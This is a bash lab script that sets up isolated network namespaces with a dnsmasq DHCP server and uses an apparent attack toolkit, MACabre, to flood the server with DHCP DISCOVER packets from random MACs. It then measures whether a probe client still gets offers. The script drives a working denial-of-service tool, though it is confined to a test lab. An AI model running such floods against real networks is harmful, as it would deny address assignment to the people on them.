#!/usr/bin/env bash
# Isolated DHCP discover flooding lab (Linux only, needs root).
#
# Topology: one bridge (the LAN) with three hosts attached:
#
#   server:   dnsmasq, the legitimate DHCP server (10.99.0.1, pool 10.99.0.100-119).
#   attacker: MACabre's discover flood, from random client MACs, with no requests.
#   client:   a probe client that sends one DISCOVER and counts the offers that match it.
#
#   Phase 1 (baseline): one probe. The server should offer an address.
#   Phase 2 (flood): the flood runs for FLOOD_SECONDS at FLOOD_RATE DISCOVERs per second.
#            A probe is sent half-way through, and another after the flood.
#            The lab counts the DISCOVERs dnsmasq logged, against the number sent.
#
# The flood creates no leases, so the pool is not consumed. The lab checks whether the
# server still answers a probe while the flood runs. It does not measure the server's
# CPU use.
#
# Nothing here touches the host's real network interfaces.
#
# Usage:
#   sudo scripts/lab/dhcp_discover_flooding_lab.sh
#   sudo FLOOD_RATE=500 FLOOD_SECONDS=20 scripts/lab/dhcp_discover_flooding_lab.sh
#
# Requirements: iproute2, dnsmasq, and the project virtualenv (.venv).
# Override the interpreter with PYTHON=/path/to/python.

set -euo pipefail

if [[ "$(id -u)" -ne 0 ]]; then
    echo "This lab needs root: run it with sudo." >&2
    exit 1
fi

for tool in ip dnsmasq; do
    if ! command -v "$tool" >/dev/null 2>&1; then
        echo "Missing required tool: $tool" >&2
        exit 1
    fi
done

ROOT="$(cd "$(dirname "$0")/../.." && pwd)"
PY="${PYTHON:-$ROOT/.venv/bin/python}"
FLOOD_RATE="${FLOOD_RATE:-200}"
FLOOD_SECONDS="${FLOOD_SECONDS:-10}"
PROBE_MAC="02:00:00:00:00:50"
WORK="$(mktemp -d)"
LOG="$WORK/dnsmasq.log"

stop_lab() {
    for pid in $(ip netns pids server 2>/dev/null || true); do
        kill "$pid" 2>/dev/null || true
    done
    for ns in client attacker server lan; do
        ip netns del "$ns" 2>/dev/null || true
    done
}
cleanup() {
    stop_lab
    rm -rf "$WORK"
}
trap cleanup EXIT

stop_lab

ip netns add lan
ip netns add server
ip netns add attacker
ip netns add client

for pair in "srv:server" "att:attacker" "cli:client"; do
    name="${pair%%:*}"
    ns="${pair##*:}"
    ip link add "p-$name" type veth peer name "h-$name"
    ip link set "h-$name" netns "$ns"
    ip link set "p-$name" netns lan
done

ip netns exec lan ip link add br0 type bridge
ip netns exec lan ip link set br0 up
for name in srv att cli; do
    ip netns exec lan ip link set "p-$name" master br0
    ip netns exec lan ip link set "p-$name" up
done

ip netns exec server ip link set lo up
ip netns exec server ip addr add 10.99.0.1/24 dev h-srv
ip netns exec server ip link set h-srv up
ip netns exec attacker ip link set h-att up
ip netns exec client ip link set h-cli up

ip netns exec server dnsmasq \
    --keep-in-foreground \
    --interface=h-srv \
    --bind-interfaces \
    --port=0 \
    --conf-file=/dev/null \
    --dhcp-authoritative \
    --no-ping \
    --dhcp-range=10.99.0.100,10.99.0.119,12h \
    --dhcp-leasefile="$WORK/leases" \
    --log-dhcp \
    --log-facility="$LOG" &
sleep 2

discovers_logged() {
    local n
    n=$(grep -c 'DHCPDISCOVER' "$LOG" 2>/dev/null || true)
    echo "${n:-0}"
}

# dnsmasq writes its log with some delay: wait until the count stops changing.
wait_for_log() {
    local previous=-1 current stable=0
    for _ in $(seq 1 60); do
        current=$(discovers_logged)
        if [[ "$current" -eq "$previous" ]]; then
            stable=$((stable + 1))
            (( stable >= 3 )) && break
        else
            stable=0
        fi
        previous=$current
        sleep 1
    done
}

PROBE_CODE='
import os, random
from scapy.all import sniff, sendp, BOOTP, DHCP
from macabre.attacks.dhcp_starvation import build_discover
mac = os.environ["PROBE_MAC"]
xid = random.getrandbits(32)
found = []
def lf(pkt):
    return pkt.haslayer(DHCP) and pkt.haslayer(BOOTP) and pkt[BOOTP].op == 2 and pkt[BOOTP].xid == xid
sniffer_done = []
import threading
t = threading.Thread(target=lambda: found.extend(sniff(iface="h-cli", timeout=3, lfilter=lf, store=True)))
t.start()
import time; time.sleep(0.5)
sendp(build_discover(mac, xid), iface="h-cli", verbose=False)
t.join()
print(len(found))
'

FLOOD_CODE='
import os, threading
from macabre.attacks.dhcp_discover_flooding import DiscoverFloodConfig, run_discover_flooding
rate = float(os.environ["FLOOD_RATE"])
seconds = float(os.environ["FLOOD_SECONDS"])
stats = run_discover_flooding(
    DiscoverFloodConfig(iface="h-att", rate=rate, count=int(rate * seconds)),
    threading.Event(),
    lambda _: None,
)
print(f"Flood: sent {stats.frames} DISCOVERs at {rate:g} per second")
'

probe() {
    ip netns exec client env PYTHONPATH="$ROOT/src" PROBE_MAC="$PROBE_MAC" "$PY" -c "$PROBE_CODE"
}

echo "Phase 1: baseline probe"
sleep 1
BASE_OFFERS="$(probe)"
wait_for_log
echo "  offers received by the probe: $BASE_OFFERS"
echo

echo "Phase 2: flood $FLOOD_RATE DISCOVERs per second for ${FLOOD_SECONDS}s"
D0="$(discovers_logged)"
ip netns exec attacker env PYTHONPATH="$ROOT/src" FLOOD_RATE="$FLOOD_RATE" FLOOD_SECONDS="$FLOOD_SECONDS" \
    "$PY" -c "$FLOOD_CODE" &
FLOOD_PID=$!
sleep $(( ${FLOOD_SECONDS%.*} / 2 ))
MID_OFFERS="$(probe)"
echo "  probe during the flood: $MID_OFFERS offers"
wait "$FLOOD_PID"
sleep 1
AFTER_OFFERS="$(probe)"
wait_for_log
D1="$(discovers_logged)"
RECEIVED=$(( D1 - D0 ))
EXPECTED=$(( FLOOD_RATE * ${FLOOD_SECONDS%.*} ))
echo "  probe after the flood: $AFTER_OFFERS offers"
echo "  DISCOVERs logged by the server during the flood: $RECEIVED (expected about $EXPECTED)"
echo

if (( BASE_OFFERS > 0 )); then
    echo "Baseline: the server offered an address to the probe. OK"
else
    echo "Baseline: the probe got no offer before the flood. Result unreliable."
fi
if (( RECEIVED * 100 >= EXPECTED * 90 )); then
    echo "Delivery: the server logged $RECEIVED of about $EXPECTED flooded DISCOVERs (at least 90%)."
else
    echo "Delivery: the server logged only $RECEIVED of about $EXPECTED flooded DISCOVERs."
fi
if (( MID_OFFERS > 0 )); then
    echo "Service: the server still offered an address to the probe during the flood. The flood did not deny service at this rate."
else
    echo "Service: the probe got no offer during the flood. The flood denied service at this rate."
fi
echo "Not measured: the server's CPU use while processing the flood."
